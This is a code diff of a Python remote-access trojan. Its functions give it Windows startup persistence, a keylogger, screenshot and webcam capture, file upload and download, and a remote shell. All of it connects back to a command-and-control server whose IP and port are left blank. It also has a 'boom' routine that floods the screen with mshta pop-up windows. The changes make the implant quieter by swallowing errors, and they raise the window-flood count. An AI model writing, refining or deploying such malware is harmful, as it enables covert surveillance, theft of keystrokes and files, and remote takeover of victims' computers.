@@ -14,17 +14,16 @@ from pynput import keyboard
 CCIP = ""  # C2 SERVER IP
 CCPORT =   # C2 SERVER PORT
 
-# packing
-
 
 # autorun function that makes the program initiate with windows
 def autorun():
     try:
         file_name = os.path.basename(__file__)
         exe_file = file_name.replace(".py", ".exe")
-        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft',
-                               'Windows', 'Start Menu', 'Programs', 'Startup', exe_file)
-        shutil.copy(exe_file, startup)
+        startup_folder = os.path.join(os.getenv(
+            'APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        startup_path = os.path.join(startup_folder, exe_file)
+        shutil.copy(exe_file, startup_path)
     except Exception as e:
         print(f"Error: {e}")
 
@@ -33,8 +32,8 @@ def data_send(data, client):
     try:
         jsondata = json.dumps(data)
         client.sendall(jsondata.encode('latin-1'))
-    except Exception as e:
-        print(f"Error sending data: {e}")
+    except Exception:
+        pass
 
 
 def data_recv(client, timeout=120):
@@ -69,8 +68,8 @@ def download_file(file, client):
                 f.write(chunk)
     except socket.timeout:
         print("Timed out")
-    except Exception as e:
-        print(f"Error: {e}")
+    except Exception:
+        pass
     finally:
         client.settimeout(None)
 
@@ -83,9 +82,8 @@ def upload_file(file, client):
                 if not chunk:
                     break
                 client.sendall(chunk)
-        print(f"{file} uploaded")
-    except Exception as e:
-        print(f"Error uploading file: {e}")
+    except Exception:
+        pass
 
 
 def screenshot(client):
@@ -93,8 +91,8 @@ def screenshot(client):
         screenshot = pyautogui.screenshot()
         screenshot.save('screenshot.png')
         upload_file('screenshot.png', client)
-    except Exception as e:
-        print(f"Error: {e}")
+    except Exception:
+        pass
     finally:
         if os.path.exists('screenshot.png'):
             os.remove('screenshot.png')
@@ -103,14 +101,14 @@ def screenshot(client):
 def boom():
     commands = [
         'mshta "javascript:for (var i = 0; i < 10; i++) { alert(\'HACKED!!! HACKED!!! HACKED!!! HACKED!!!\'); } window.close();"',
-        'mshta "javascript:for (var i = 0; i < 10000000; i++) { window.open(\'\',\'Window\' + i,\'width=1280,height=720\').document.write(\'<h1>HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHHA!</h1>\'); }"'
+        'mshta "javascript:for (var i = 0; i < 10000000000; i++) { window.open(\'\',\'Window\' + i,\'width=1280,height=720\').document.write(\'<h1>HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHAH!HAHAHAHAHAHAHAHHA!</h1>\'); }"'
     ]
 
     for command in commands:
         try:
             subprocess.run(command, shell=True, check=True)
-        except subprocess.CalledProcessError as e:
-            print(f"Error: {e}")
+        except subprocess.CalledProcessError:
+            pass
 
 
 def keylogger_start(client):
@@ -119,7 +117,7 @@ def keylogger_start(client):
 
     def on_press(key):
         try:
-            key_char = f'>> {key.char} \n '
+            key_char = f' {key.char}'
         except AttributeError:
             key_char = f' "{key}" '
 
@@ -138,8 +136,8 @@ def keylogger_start(client):
                         buffer.clear()
 
                 time.sleep(1)
-            except Exception as e:
-                print(f"Error in keylogger: {e}")
+            except Exception:
+                pass
 
     listener = keyboard.Listener(on_press=on_press)
     listener_thread = threading.Thread(target=listener.start, daemon=True)
@@ -153,7 +151,6 @@ def capture_cam(client):
     print("Capturing webcam...")
     cap = cv2.VideoCapture(0)
     if not cap.isOpened():
-        print("Webcam was not found")
         client.sendall(b"Webcam was not found")
         return
 
@@ -228,22 +225,22 @@ def shell(client):
             else:
                 threading.Thread(target=cmd, args=(comm, client)).start()
         except KeyboardInterrupt:
-            conn(CCIP, CCPORT)
+            connection(CCIP, CCPORT)
 
 
-def conn(ccip, ccport):
+def connection(ccip, ccport):
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.connect((ccip, ccport))
         return client
-    except Exception as e:
-        print(f"Error: {e}")
+    except Exception:
+        pass
 
 
 if __name__ == "__main__":
     autorun()
     while True:
-        client = conn(CCIP, CCPORT)
+        client = connection(CCIP, CCPORT)
         if client:
             try:
                 shell(client)
